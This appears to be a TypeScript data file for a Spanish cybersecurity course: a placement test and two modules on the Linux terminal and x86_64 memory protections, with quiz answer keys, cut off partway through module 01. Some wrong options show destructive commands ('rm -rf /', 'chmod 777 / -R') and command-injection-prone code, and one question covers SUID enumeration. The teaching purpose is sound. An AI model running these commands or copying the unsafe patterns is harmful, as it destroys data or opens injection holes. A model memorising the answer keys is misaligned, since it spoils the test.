/**
 * Complete 13-Module Progressive Cybersecurity Curriculum (Sala 00 to Sala 12)
 * Includes:
 * - Sala 00: Tu Primer Día con la Terminal, Internet y Ética Legal (for absolute beginners)
 * - 5 Active Recall questions per room with balanced A/B/C/D correct option indices
 * - Separate Transfer Evaluation Scenario per room (distinct from Active Recall quiz)
 * - Interactive Glossary terms & "Predict Before Seeing" prompts
 * - Verified direct educational resources & official documentation (no search query links or invented durations)
 * - 10-question Initial Placement Test (Test de Nivel Inicial)
 */

export interface VideoResource {
  title: string;
  author: string;
  duration: string;
  url: string;
  focus: string;
}

export interface DocResource {
  title: string;
  organization: string;
  url: string;
  type: 'Estándar Oficial' | 'Guía Técnica' | 'RFC / Documentación' | 'Laboratorio Externo';
}

export interface ActiveRecallQuestion {
  id: string;
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
  commonMisconception: string;
}

export interface GlossaryItem {
  term: string;
  definition: string;
}

export interface DeliberatePracticeTask {
  prompt: string;
  scenario: string;
  starterCommandOrCode: string;
  expectedPatterns: string[];
  hint: string;
  feedbackSuccess: string;
  feedbackError: string;
}

export interface CurriculumModule {
  id: string;
  number: string;
  title: string;
  tier: 'Fundamentos' | 'Intermedio' | 'Avanzado / Senior';
  domain: string;
  estimatedHours: number;
  summary: string;
  objectives: string[];
  glossary?: GlossaryItem[];
  predictionPrompt?: {
    question: string;
    reveal: string;
  };
  theorySections: {
    heading: string;
    content: string;
    codeSnippet?: string;
  }[];
  realWorldCase: {
    title: string;
    context: string;
    technicalRootCause: string;
    lesson: string;
  };
  diagramType:
    | 'terminal-filesystem'
    | 'memory-stack'
    | 'os-rings'
    | 'tcp-handshake'
    | 'python-automation'
    | 'crypto-zero-trust'
    | 'network-defense'
    | 'owasp-sqli'
    | 'vuln-lifecycle'
    | 'siem-pipeline'
    | 'dfir-chain'
    | 'pentest-killchain'
    | 'cloud-iam';
  diagramCaption: string;
  activeRecallQuestions: ActiveRecallQuestion[];
  transferScenarioQuestion: ActiveRecallQuestion;
  selfExplanationPrompt: {
    question: string;
    guidingSubQuestions: string[];
    keyTerms: string[];
    exemplarAnswer: string;
  };
  deliberatePractice: DeliberatePracticeTask;
  knowledgeSummary: string[];
  spanishVideos: VideoResource[];
  officialDocs: DocResource[];
  linkedLabId: string;
}

export interface PlacementQuestion {
  id: string;
  domain: string;
  question: string;
  options: string[];
  correctIndex: number;
  recommendedSkipModuleId?: string;
}

export const PLACEMENT_TEST_QUESTIONS: PlacementQuestion[] = [
  {
    id: 'pt-01',
    domain: 'Terminal & Linux Básico',
    question: '¿Qué comando muestra el directorio de trabajo actual y qué significa el permiso `-rwxr-xr-x` en Linux?',
    options: [
      'pwd muestra la ruta actual; el propietario tiene lectura/escritura/ejecución (7) y el grupo/otros lectura/ejecución (5).',
      'cd muestra la ruta actual; todos los usuarios tienen permisos de escritura.',
      'ls borra el directorio actual; rwx significa archivo cifrado.',
      'whoami muestra la ruta actual; rwx solo aplica a Windows.',
    ],
    correctIndex: 0,
    recommendedSkipModuleId: 'mod-00',
  },
  {
    id: 'pt-02',
    domain: 'Arquitectura x86_64',
    question: 'En una CPU x86_64, ¿qué registro contiene la dirección de la próxima instrucción a ejecutar y qué mitigación marca la pila como no ejecutable?',
    options: [
      'RSP y ASLR',
      'RBP y Stack Canary',
      'RIP (Instruction Pointer) y NX/DEP (No-eXecute)',
      'RAX y RELRO',
    ],
    correctIndex: 2,
    recommendedSkipModuleId: 'mod-01',
  },
  {
    id: 'pt-03',
    domain: 'Linux Internals',
    question: '¿Qué comando busca binarios con bit SUID activo en todo el sistema descartando errores de permisos?',
    options: [
      'chmod 777 / -R',
      'find / -perm -4000 -type f 2>/dev/null',
      'grep -rn "SUID" /etc/',
      'ls -l /home',
    ],
    correctIndex: 1,
    recommendedSkipModuleId: 'mod-02',
  },
  {
    id: 'pt-04',
    domain: 'Redes & TCP/IP',
    question: '¿Cuántas direcciones IP de host utilizables tiene una subred `/26` y qué envía un escaneo `nmap -sS` tras recibir `[SYN, ACK]`?',
    options: [
      '64 hosts y envía [FIN]',
      '30 hosts y envía [ACK]',
      '126 hosts y envía [SYN]',
      '62 hosts utilizables y envía inmediatamente [RST] sin completar el handshake',
    ],
    correctIndex: 3,
    recommendedSkipModuleId: 'mod-03',
  },
  {
    id: 'pt-05',
    domain: 'Scripting Seguro',
    question: 'En Python, ¿cómo se evita una vulnerabilidad de Command Injection al invocar un binario del sistema con datos del usuario?',
    options: [
      'Usando subprocess.run(["nmap", "-sV", target], shell=False, check=True)',
      'Usando os.system("nmap " + target)',
      'Usando eval(target)',
      'Usando subprocess.Popen(cmd, shell=True)',
    ],
    correctIndex: 0,
    recommendedSkipModuleId: 'mod-04',
  },
  {
    id: 'pt-06',
    domain: 'Criptografía Aplicada',
    question: '¿Qué modo de cifrado simétrico es un esquema AEAD (proporciona confidencialidad e integridad simultáneamente)?',
    options: [
      'AES-128-ECB',
      'MD5 con Salt',
      'AES-256-GCM (o ChaCha20-Poly1305)',
      'Base64 URL-Safe',
    ],
    correctIndex: 2,
    recommendedSkipModuleId: 'mod-05',
  },
  {
    id: 'pt-07',
    domain: 'Firewalls & IDS/IPS',
    question: '¿Por qué es importante usar `ufw insert 1 deny from <IP>` en lugar de añadir la regla al final en un firewall Netfilter?',
    options: [
      'Porque el firewall evalúa las reglas en orden alfabético.',
      'Porque Netfilter evalúa de arriba hacia abajo (First Match Wins) y una regla ALLOW previa permitiría el paso.',
      'Porque UFW solo soporta una regla activa.',
      'Porque insert 1 reinicia el servidor.',
    ],
    correctIndex: 1,
    recommendedSkipModuleId: 'mod-06',
  },
  {
    id: 'pt-08',
    domain: 'Seguridad Web (OWASP)',
    question: '¿Por qué las Consultas Parametrizadas (Prepared Statements) detienen la Inyección SQL de raíz?',
    options: [
      'Porque bloquean la dirección IP del navegador con JavaScript.',
      'Porque borran las comillas con una expresión regular.',
      'Porque encriptan la tabla en disco con RSA.',
      'Porque el motor SQL compila primero el árbol sintáctico (AST) de la consulta e inyecta el parámetro después solo como dato literal.',
    ],
    correctIndex: 3,
    recommendedSkipModuleId: 'mod-07',
  },
  {
    id: 'pt-09',
    domain: 'SOC & DFIR',
    question: 'Según el RFC 3227 (Orden de Volatilidad), ¿qué evidencia debe preservarse primero en un incidente activo y qué evento de Sysmon detecta lectura de `lsass.exe`?',
    options: [
      'Memoria RAM / conexiones activas primero; Sysmon Event ID 10 (ProcessAccess).',
      'Discos duros apagando el cable primero; Sysmon Event ID 1.',
      'Cintas de backup primero; Windows Event ID 4625.',
      'Logs de impresora primero; Sysmon Event ID 22.',
    ],
    correctIndex: 0,
  },
  {
    id: 'pt-10',
    domain: 'Cloud & Kubernetes',
    question: '¿Qué requisito técnico introduce IMDSv2 en AWS para mitigar el robo de credenciales IAM mediante vulnerabilidades SSRF?',
    options: [
      'Cambiar la IP 169.254.169.254 por DNS dinámico.',
      'Exigir una petición HTTP PUT inicial con cabecera X-aws-ec2-metadata-token-ttl-seconds para obtener un token de sesión.',
      'Desactivar todas las políticas IAM de la cuenta.',
      'Ejecutar todos los contenedores con privileged: true.',
    ],
    correctIndex: 1,
  },
];

export const CURRICULUM_MODULES: CurriculumModule[] = [
  {
    id: 'mod-00',
    number: '00',
    title: 'Fundamentos desde Cero: Tu Primer Día con la Terminal, Internet y Ética Legal',
    tier: 'Fundamentos',
    domain: 'Iniciación & Terminal',
    estimatedHours: 6,
    summary:
      'Empieza sin conocimientos previos: comprende qué es un sistema operativo, cómo comunicarte con Linux mediante la terminal (pwd, ls, cd, cat), cómo se leen los permisos básicos (rwx), cómo viaja una petición en Internet (IP, DNS, Puertos) y la regla de oro legal del hacking ético.',
    objectives: [
      'Navegar con soltura por el árbol de directorios de Linux usando pwd, ls -la, cd y cat sin miedo a la consola.',
      'Leer e interpretar una línea de permisos de archivos (-rwxr-xr-x) distinguiendo Propietario, Grupo y Otros.',
      'Comprender qué es una dirección IP, un puerto de red y cómo el navegador encuentra un servidor mediante DNS.',
      'Aplicar la regla fundamental del Hacking Ético: actuar únicamente dentro del alcance autorizado por escrito (Scope & RoE).',
    ],
    glossary: [
      {
        term: 'Shell / Terminal',
        definition: 'Intérprete de comandos (como Bash) que recibe tus órdenes en texto y se las pide al núcleo (Kernel) del sistema operativo.',
      },
      {
        term: 'Ruta Absoluta',
        definition: 'Dirección completa de un archivo empezando desde la raíz del sistema `/`, por ejemplo `/home/auditor/bienvenida_terminal.txt`.',
      },
      {
        term: 'Dirección IP',
        definition: 'Identificador numérico (ej. 10.10.10.45 o 203.0.113.42) que localiza un dispositivo dentro de una red TCP/IP.',
      },
      {
        term: 'Alcance (Scope)',
        definition: 'Lista explícita y firmada de direcciones IP, dominios y horarios sobre los cuales tienes permiso legal para realizar pruebas.',
      },
    ],
    predictionPrompt: {
      question: 'Antes de mirar el código: si estás en `/home/auditor` y un archivo empieza por un punto (ej. `.bashrc`), ¿crees que el comando `ls` simple lo mostrará?',
      reveal: '¡No! En Linux, cualquier archivo o carpeta que empieza con `.` está oculto por convención. Necesitas añadir la bandera `-a` (`ls -la`) para ver todos los archivos, incluidos los ocultos.',
    },
    theorySections: [
      {
        heading: '1. ¿Qué es la Terminal y cómo se organiza el Sistema de Archivos en Linux?',
        content:
          'Cuando usas un ordenador con ratón y ventanas (interfaz gráfica o GUI), estás haciendo clic sobre dibujos que por debajo ejecutan órdenes. En ciberseguridad usamos la Terminal (CLI) porque es rápida, precisa y funciona igual en un portátil que en un servidor en la nube sin pantalla. En Linux todo cuelga de una carpeta principal llamada Raíz (`/`). Tu usuario personal vive dentro de `/home/auditor`. Con cuatro comandos básicos puedes orientarte en cualquier servidor del mundo: `whoami` (¿quién soy?), `pwd` (¿en qué carpeta estoy?), `ls -la` (¿qué archivos hay aquí y qué permisos tienen?) y `cat <archivo>` (mostrar el contenido de un archivo de texto).',
        codeSnippet: `# Tus 4 primeros comandos esenciales en Linux:
whoami                        # Muestra tu usuario actual (auditor)
pwd                           # Imprime tu carpeta actual (/home/auditor)
ls -la                        # Lista todos los archivos, permisos y ocultos
cat bienvenida_terminal.txt   # Lee el contenido de tu archivo de bienvenida`,
      },
      {
        heading: '2. Cómo leer Permisos (`rwx`), Direcciones IP y la Ética Profesional',
        content:
          'Al ejecutar `ls -la` verás cadenas como `-rwxr-xr--`. El primer carácter indica si es un archivo normal (`-`) o un directorio (`d`). Los siguientes 9 caracteres se leen en 3 bloques de 3: (1) Usuario Propietario, (2) Grupo, y (3) Otros usuarios. La letra `r` (Read = 4) permite leer, `w` (Write = 2) permite modificar, y `x` (Execute = 1) permite ejecutar como programa. Por último, recuerda siempre la frontera entre un profesional y un delito: jamás se escanea ni audita un servidor en Internet sin autorización escrita (Scope) o fuera de entornos de laboratorio dedicados como este simulador.',
      },
    ],
    realWorldCase: {
      title: 'Archivos de Configuración Ocultos (.env) Expuestos por Permisos Incorrectos',
      context:
        'Un administrador principiante subió las claves de su base de datos en un archivo oculto `.env` pensando que nadie lo vería porque `ls` normal no lo listaba y le asignó permisos `rw-rw-rw-` (666).',
      technicalRootCause:
        'Ocultar un archivo con un punto inicial no es un control de seguridad; cualquier usuario local con `ls -la` pudo listar el archivo y leerlo porque tenía permiso de lectura para "Otros" (`r--`).',
      lesson:
        'La seguridad por oscuridad no funciona. Los archivos sensibles deben restringirse con permisos estrictos (`chmod 600`, solo lectura/escritura para el propietario).',
    },
    diagramType: 'terminal-filesystem',
    diagramCaption:
      'Jerarquía FHS de Linux (/ -> /home/auditor, /etc, /var/log) y anatomía de permisos POSIX (-rwxr-xr-- / chmod 600).',
    activeRecallQuestions: [
      {
        id: 'ar-00-1',
        question: '¿Qué comando de Linux debes escribir en la terminal para saber exactamente en qué carpeta (directorio) te encuentras en este instante?',
        options: ['pwd (Print Working Directory)', 'whoami', 'cat', 'chmod'],
        correctIndex: 0,
        explanation:
          '`pwd` imprime la ruta absoluta del directorio actual (por ejemplo `/home/auditor`), permitiéndote orientarte antes de ejecutar cualquier acción.',
        commonMisconception: 'Confundir `pwd` (directorio actual) con `passwd` (cambiar contraseña) o `whoami` (nombre de usuario).',
      },
      {
        id: 'ar-00-2',
        question: 'Si ejecutas `ls` sin opciones y no ves un archivo que empieza por un punto (como `.ssh` o `.profile`), ¿qué bandera debes añadir para listar absolutamente todos los archivos y sus permisos detallados?',
        options: ['ls --delete', 'ls -la', 'cd ..', 'cat -n'],
        correctIndex: 1,
        explanation:
          'La opción `-l` muestra el formato largo (permisos, propietario, tamaño) y `-a` (all) incluye todos los archivos ocultos que comienzan con `.`.',
        commonMisconception: 'Pensar que un archivo borrado es lo mismo que un archivo oculto que empieza con punto.',
      },
      {
        id: 'ar-00-3',
        question: 'En la cadena de permisos `-rwxr-x---` (octal 750), ¿qué permisos tienen los usuarios que NO son el propietario ni pertenecen al grupo del archivo (el tercer bloque `---`)?',
        options: [
          'Tienen permiso total de lectura y escritura.',
          'Solo pueden ejecutar el archivo.',
          'Ninguno: no pueden leer, ni escribir, ni ejecutar el archivo.',
          'Pueden borrar el archivo si usan cat.',
        ],
        correctIndex: 2,
        explanation:
          'Los tres bloques representan Usuario (`rwx` = 7), Grupo (`r-x` = 5) y Otros (`---` = 0). El bloque `---` niega cualquier acceso al resto de usuarios.',
        commonMisconception: 'Leer los 9 caracteres como un solo grupo en lugar de separarlos en bloques de 3 (Propietario / Grupo / Otros).',
      },
      {
        id: 'ar-00-4',
        question: '¿Qué función cumple el protocolo DNS (Domain Name System) cuando escribes un nombre de dominio en tu navegador o herramienta de red?',
        options: [
          'Encripta el disco duro de tu ordenador.',
          'Cambia la contraseña del usuario root.',
          'Borra el historial de comandos de la terminal.',
          'Traduce un nombre legible por humanos (ej. ejemplo.com) a su dirección IP numérica (ej. 203.0.113.42) para que los paquetes sepan a dónde ir.',
        ],
        correctIndex: 3,
        explanation:
          'Los routers encadenan paquetes usando direcciones IP numéricas; DNS actúa como la agenda telefónica de Internet traduciendo nombres de dominio a direcciones IP.',
        commonMisconception: 'Creer que DNS cifra el tráfico (eso lo hace TLS/HTTPS).',
      },
      {
        id: 'ar-00-5',
        question: '¿Cuál es el requisito ético y legal INDISPENSABLE antes de realizar cualquier escaneo o prueba de seguridad sobre un sistema informático?',
        options: [
          'Contar con autorización expresa y por escrito del propietario del sistema (Alcance / Scope y Reglas de Enfrentamiento) o usar un entorno de laboratorio propio.',
          'Hacerlo de noche cuando haya menos tráfico.',
          'Usar el modo incógnito del navegador.',
          'Limitarse a usar comandos gratuitos.',
        ],
        correctIndex: 0,
        explanation:
          'La única diferencia legal entre una auditoría profesional de ciberseguridad y un delito informático es el permiso explícito documentado en el Scope.',
        commonMisconception: 'Creer que "solo mirar con un escáner sin borrar nada" en un servidor ajeno es legal sin permiso.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-00-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Acabas de entrar por primera vez a un servidor Linux de prácticas. Necesitas verificar en qué ruta estás, descubrir si hay archivos ocultos en esa carpeta y leer un archivo llamado `nota_operaciones.txt`. ¿Cuál es la secuencia exacta de comandos?',
      options: [
        'rm -rf / -> reboot -> whoami',
        'pwd -> ls -la -> cat nota_operaciones.txt',
        'cd /root -> chmod 777 * -> ping',
        'ls -> mkdir nota_operaciones.txt -> exit',
      ],
      correctIndex: 1,
      explanation:
        'Primero confirmas tu ubicación con `pwd`, luego listas todos los archivos (incluidos ocultos y permisos) con `ls -la`, y finalmente muestras el contenido del archivo de texto con `cat nota_operaciones.txt`.',
      commonMisconception: 'Intentar usar `cd nota_operaciones.txt` sobre un archivo de texto en lugar de usar `cat` para leerlo.',
    },
    selfExplanationPrompt: {
      question:
        'Explica con tus propias palabras qué diferencia hay entre los permisos de lectura (`r`), escritura (`w`) y ejecución (`x`) en Linux, y por qué siempre debemos verificar nuestra ruta (`pwd`) y permisos (`ls -la`) al entrar a un servidor.',
      guidingSubQuestions: [
        '¿Qué representan los tres grupos de letras en `-rwxr-xr-x`?',
        '¿Por qué no debemos ejecutar comandos en servidores fuera de nuestro laboratorio o sin permiso escrito?',
      ],
      keyTerms: ['permisos', 'lectura', 'directorio', 'propietario', 'autorizacion'],
      exemplarAnswer:
        'En Linux cada archivo divide sus permisos en tres bloques: propietario, grupo y otros usuarios, usando lectura (r), escritura (w) y ejecución (x). Al entrar a un servidor verificamos el directorio actual con pwd y listamos los permisos con ls -la para comprender qué podemos leer o ejecutar de forma segura, actuando siempre dentro de un entorno con autorización legal.',
    },
    deliberatePractice: {
      prompt:
        'Abre la terminal interactiva y ejecuta `cat bienvenida_terminal.txt` para leer tu guía de primer día y obtener tu primera bandera.',
      scenario: 'Es tu primer día como analista en prácticas dentro de la estación de laboratorio `srv-prod-01`.',
      starterCommandOrCode: 'cat bienvenida_terminal.txt',
      expectedPatterns: ['cat', 'bienvenida_terminal.txt', 'ls', 'pwd'],
      hint: 'Escribe `cat bienvenida_terminal.txt` y pulsa Ejecutar.',
      feedbackSuccess:
        '¡Felicidades! Has ejecutado tu primera inspección en la terminal Linux y capturado tu primera bandera.',
      feedbackError: 'Escribe exactamente `cat bienvenida_terminal.txt` en la terminal para leer el archivo de bienvenida.',
    },
    knowledgeSummary: [
      '`pwd` muestra dónde estás; `ls -la` lista archivos (incluidos ocultos con `.`); `cd` cambia de carpeta; `cat` muestra el contenido de un archivo.',
      'Los permisos Linux se dividen en Propietario, Grupo y Otros con valores `r` (4), `w` (2) y `x` (1).',
      'Toda práctica de ciberseguridad se realiza exclusivamente en laboratorios controlados o bajo autorización escrita (Scope).',
    ],
    spanishVideos: [
      {
        title: 'Guía Oficial de Iniciación a Linux y la Línea de Comandos (Ubuntu / Debian)',
        author: 'Documentación Oficial Ubuntu Community',
        duration: 'Lectura Interactiva',
        url: 'https://ubuntu.com/tutorials/command-line-for-beginners',
        focus: 'Tutorial oficial paso a paso para dominar directorios, archivos y permisos desde cero.',
      },
      {
        title: 'Conceptos Básicos de Ciberseguridad y Uso Seguro de Redes',
        author: 'INCIBE (Instituto Nacional de Ciberseguridad)',
        duration: 'Portal Formativo',
        url: 'https://www.incibe.es/ciudadania',
        focus: 'Fundamentos de seguridad, redes y buenas prácticas en español.',
      },
    ],
    officialDocs: [
      {
        title: 'GNU Coreutils Manual — File permissions & Directory navigation (ls, pwd, cat, chmod)',
        organization: 'Free Software Foundation',
        url: 'https://www.gnu.org/software/coreutils/manual/html_node/index.html',
        type: 'Estándar Oficial',
      },
      {
        title: 'INCIBE — Guías Técnicas de Ciberseguridad en Español',
        organization: 'INCIBE España',
        url: 'https://www.incibe.es/empresas/guias',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-linux-privesc',
  },
  {
    id: 'mod-01',
    number: '01',
    title: 'Fundamentos de Informática y Arquitectura de Computadores',
    tier: 'Fundamentos',
    domain: 'Arquitectura',
    estimatedHours: 8,
    summary:
      'Comprende cómo el procesador ejecuta instrucciones, cómo se organiza la memoria virtual (Stack, Heap, BSS, Text), los registros x86_64 y por qué las vulnerabilidades de corrupción de memoria ocurren a nivel físico y lógico.',
    objectives: [
      'Diferenciar el rol de los registros RSP, RBP y RIP durante la ejecución de una subrutina en x86_64.',
      'Analizar la disposición del espacio de direcciones virtuales de un proceso (Text, Data, Heap y Stack).',
      'Explicar el mecanismo de interrupciones, llamadas al sistema (syscalls) y anillos de privilegio (Ring 0 vs Ring 3).',
      'Identificar cómo las mitigaciones NX, Stack Canary, PIE y ASLR protegen la memoria de un proceso.',
    ],
    glossary: [
      {
        term: 'RIP (Instruction Pointer)',
        definition: 'Registro de 64 bits de la CPU que guarda la dirección exacta de memoria de la siguiente instrucción que se va a ejecutar.',
      },
      {
        term: 'Stack (Pila)',
        definition: 'Región de memoria LIFO para variables locales y direcciones de retorno que crece hacia direcciones bajas.',
      },
      {
        term: 'NX (No-eXecute)',
        definition: 'Protección de hardware/kernel que marca la pila y el heap como datos no ejecutables (rw-p sin x).',
      },
      {
        term: 'ASLR',
        definition: 'Address Space Layout Randomization: cambia aleatoriamente las direcciones de memoria en cada ejecución.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de continuar: Si la pila (Stack) guarda datos temporales como el nombre de un usuario, ¿debería la CPU tener permiso para ejecutar esos bytes como si fueran instrucciones del programa (`rwxp`)?',
      reveal: '¡Jamás! Si la pila fuera ejecutable (`rwxp`), un atacante podría meter código máquina dentro de su nombre de usuario y engañar a la CPU para ejecutarlo. Por eso la protección NX marca la pila como `rw-p` (sin `x`).',
    },
    theorySections: [
      {
        heading: '1. Arquitectura Von Neumann, Registros x86_64 y Ciclo de Instrucción',
        content:
          'Un profesional de ciberseguridad no ve un programa como una caja negra: comprende que cada línea de código de alto nivel se traduce a opcodes ejecutados por la CPU. En la arquitectura x86_64, el registro RIP (Instruction Pointer) apunta siempre a la siguiente instrucción a ejecutar; RSP (Stack Pointer) señala la cima actual de la pila; y RBP (Base Pointer) delimita el marco de pila (Stack Frame) de la función activa.',
        codeSnippet: `; Prólogo clásico de una función en ensamblador x86_64
push rbp              ; Guarda el marco base anterior en el Stack
mov  rbp, rsp         ; Establece el nuevo marco base
sub  rsp, 0x40        ; Reserva 64 bytes para variables locales en la pila`,
      },
      {
        heading: '2. Anatomía de la Memoria Virtual: Stack vs. Heap y Protección NX/ASLR',
        content:
          'Mientras el Heap crece hacia direcciones de memoria más altas (asignación dinámica mediante malloc/new), el Stack crece hacia direcciones más bajas (LIFO). Cuando un búfer local en el Stack recibe más bytes de los reservados sin verificación de límites, sobrescribe variables adyacentes, el RBP guardado y finalmente la dirección de retorno (Saved RIP). Defensas modernas como NX/DEP (No-eXecute), Stack Canaries y ASLR (Address Space Layout Randomization) mitigan la explotación directa.',
      },
    ],
    realWorldCase: {
      title: 'Desbordamiento de Lectura en Memoria Heap (Heartbleed CVE-2014-0160)',
      context:
        'En OpenSSL, la extensión Heartbeat confiaba ciegamente en el campo de longitud enviado por el cliente sin validar que coincidiera con el tamaño real del payload en memoria.',
      technicalRootCause:
        'Lectura fuera de límites (Out-of-bounds Read) en el Heap mediante memcpy(), permitiendo extraer hasta 64 KB de memoria privada del servidor por petición (claves privadas TLS y tokens de sesión).',
      lesson:
        'Nunca confiar en metadatos de longitud proporcionados por el usuario; validar límites en memoria antes de cualquier operación de copia.',
    },
    diagramType: 'memory-stack',
    diagramCaption:
      'Disposición del espacio de memoria virtual en x86_64: crecimiento opuesto entre Heap y Stack y ubicación crítica del Saved RIP.',
    activeRecallQuestions: [
      {
        id: 'ar-01-1',
        question: '¿Qué registro en arquitectura x86_64 almacena la dirección de memoria de la próxima instrucción que ejecutará la CPU?',
        options: ['RSP (Stack Pointer)', 'RIP (Instruction Pointer)', 'RBP (Base Pointer)', 'RAX (Accumulator)'],
        correctIndex: 1,
        explanation:
          'RIP (Instruction Pointer) contiene la dirección exacta del segmento de código que la CPU ejecutará a continuación. Controlar RIP es el objetivo central del secuestro de flujo de control.',
        commonMisconception:
          'Confundir RSP (que apunta al tope de la pila de datos) con RIP (que apunta a la instrucción en ejecución).',
      },
      {
        id: 'ar-01-2',
        question: '¿En qué dirección crece la pila (Stack) en arquitecturas x86/x86_64 cuando se ejecuta una instrucción PUSH y por qué es relevante para un Buffer Overflow?',
        options: [
          'Crece hacia direcciones de memoria más bajas, mientras la escritura de un arreglo avanza hacia direcciones más altas (hacia el Saved RIP).',
          'Crece hacia direcciones más altas igual que el Heap, evitando colisiones.',
          'Se mantiene estática en el segmento .text de solo lectura.',
          'Solo almacena código compilado y nunca variables locales.',
        ],
        correctIndex: 0,
        explanation:
          'El Stack crece hacia direcciones menores (decrementando RSP), pero los buffers se escriben hacia direcciones mayores, lo que permite que un desbordamiento alcance el RBP y el Saved RIP de la función.',
        commonMisconception: 'Pensar que el Stack y el buffer se escriben en el mismo sentido.',
      },
      {
        id: 'ar-01-3',
        question: '¿Qué mitigación del compilador coloca un valor centinela aleatorio justo antes del Saved RBP y el Saved RIP para abortar el programa si detecta sobrescritura lineal en la pila?',
        options: ['ASLR', 'NX / DEP', 'Stack Canary (`-fstack-protector-strong`)', 'Full RELRO'],
        correctIndex: 2,
        explanation:
          'El Stack Canary se inserta en el prólogo de la función y se comprueba antes de la instrucción `ret`; si fue alterado por un Buffer Overflow, el proceso termina inmediatamente con `__stack_chk_fail`.',
        commonMisconception: 'Confundir el Stack Canary (integridad del marco de pila) con NX (permisos de página no ejecutables).',
      },
      {
        id: 'ar-01-4',
        question: 'Al inspeccionar `/proc/self/maps` en Linux, observas que el segmento `[stack]` tiene permisos `rw-p`. ¿Qué indica la ausencia de la letra `x` en esos permisos?',
        options: [
          'Que la pila está corrupta.',
          'Que el proceso corre en Ring 0.',
          'Que ASLR está desactivado.',
          'Que el bit NX (No-eXecute) está activo, impidiendo que la CPU ejecute instrucciones directamente desde la pila.',
        ],
        correctIndex: 3,
        explanation:
          '`rw-p` significa Lectura (`r`), Escritura (`w`), Sin ejecución (`-`) y memoria Privada (`p`), confirmando que NX protege la pila.',
        commonMisconception: 'Creer que `/proc/self/maps` imprime banderas del compilador como RELRO en lugar de los mapeos reales de páginas del kernel.',
      },
      {
        id: 'ar-01-5',
        question: '¿Qué mecanismo utiliza un proceso de usuario (Ring 3) para solicitar de forma controlada al Kernel (Ring 0) que abra un archivo o cree una conexión de red?',
        options: [
          'Una Llamada al Sistema (Syscall, ej. `open`, `read`, `execve`).',
          'Modificar directamente la memoria física de la tarjeta de red.',
          'Desactivar el reloj de la CPU.',
          'Escribir en el segmento `.text` de otro proceso.',
        ],
        correctIndex: 0,
        explanation:
          'El espacio de usuario (Ring 3) no tiene acceso directo al hardware; debe invocar una instrucción `syscall` para que el Kernel (Ring 0) valide los permisos y realice la operación.',
        commonMisconception: 'Suponer que las aplicaciones leen el disco duro directamente sin pasar por el kernel.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-01-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Auditas un binario ELF en Linux. En `/proc/self/maps` ves que la pila es `rw-p` y `/proc/sys/kernel/randomize_va_space` vale `2`, pero `checksec` reporta `Canary: No`. ¿Qué riesgo persiste aunque NX y ASLR estén activos?',
      options: [
        'El atacante puede inyectar y ejecutar shellcode directamente en la pila porque NX no funciona.',
        'Las direcciones de libc son fijas en cada reinicio.',
        'Un desbordamiento de búfer en la pila no será abortado antes de `ret`, permitiendo sobrescribir el Saved RIP (por ejemplo mediante ROP si hay una fuga de punteros).',
        'Ninguno, con ASLR en 2 es imposible corromper la pila.',
      ],
      correctIndex: 2,
      explanation:
        'Sin Stack Canary, una sobrescritura contigua alcanza el Saved RIP sin ser detectada antes del retorno de la función; si el atacante combina esto con un Information Disclosure, puede encadenar gadgets (ROP) pese a NX y ASLR.',
      commonMisconception: 'Pensar que NX por sí solo impide sobrescribir la dirección de retorno Saved RIP.',
    },
    selfExplanationPrompt: {
      question:
        'Explica con tus propias palabras qué sucede exactamente en la pila (Stack) cuando una función en C usa `gets()` sin límite de tamaño y cómo la protección Stack Canary detecta esa anomalía antes de que la función retorne.',
      guidingSubQuestions: [
        '¿Qué valor crítico se encuentra almacenado justo después del buffer local y el RBP en el marco de pila?',
        '¿Dónde se coloca el valor Canary y cuándo se verifica?',
      ],
      keyTerms: ['stack', 'rip', 'canary', 'retorno', 'buffer'],
      exemplarAnswer:
        'Cuando se escribe más allá del tamaño del buffer en el Stack, los datos sobrescriben la memoria contigua hasta alcanzar la dirección de retorno (Saved RIP). El compilador coloca un valor aleatorio (Stack Canary) justo antes del RBP y el Saved RIP; antes de ejecutar la instrucción RET, el programa verifica si ese Canary fue modificado y aborta la ejecución si detecta corrupción.',
    },
    deliberatePractice: {
      prompt:
        'Inspecciona los segmentos de memoria en `/proc/self/maps` y luego audita las mitigaciones del binario con `checksec --file=/usr/local/bin/sysdiag`.',
      scenario: 'Debes auditar las regiones de memoria virtual del proceso actual y las protecciones ELF del binario `/usr/local/bin/sysdiag`.',
      starterCommandOrCode: 'checksec --file=/usr/local/bin/sysdiag',
      expectedPatterns: ['/proc/self/maps', 'checksec', 'randomize_va_space'],
      hint: 'Ejecuta primero `cat /proc/self/maps` y luego `checksec --file=/usr/local/bin/sysdiag`.',
      feedbackSuccess:
        'Correcto. Has separado la inspección de páginas de memoria virtual (`/proc/self/maps`) de la auditoría de cabeceras ELF (`checksec`).',
      feedbackError:
        'Utiliza `cat /proc/self/maps` o `checksec --file=/usr/local/bin/sysdiag`.',
    },
    knowledgeSummary: [
      'La CPU opera en anillos de privilegio: Ring 3 (User Space) está aislado de Ring 0 (Kernel Space) mediante llamadas al sistema (syscalls).',
      'El Stack almacena variables locales y direcciones de retorno (Saved RIP); el Heap gestiona memoria dinámica.',
      'NX impide ejecutar código inyectado en el Stack; ASLR aleatoriza las direcciones base; los Stack Canaries detectan sobrescritura lineal antes de `ret`.',
    ],
    spanishVideos: [
      {
        title: 'Documentación del Kernel Linux: El sistema de archivos /proc y mapas de memoria',
        author: 'The Linux Kernel Archives',
        duration: 'Referencia Oficial',
        url: 'https://docs.kernel.org/filesystems/proc.html',
        focus: 'Especificación exacta de `/proc/<pid>/maps`, permisos de página y `randomize_va_space`.',
      },
      {
        title: 'Guía de Mitigación de Corrupción de Memoria y Compilación Segura',
        author: 'OWASP Foundation',
        duration: 'Guía Técnica',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html',
        focus: 'Banderas de compilación para Stack Canary, NX, PIE y RELRO.',
      },
    ],
    officialDocs: [
      {
        title: 'Intel 64 and IA-32 Architectures Software Developer Manuals',
        organization: 'Intel Corporation',
        url: 'https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html',
        type: 'Estándar Oficial',
      },
      {
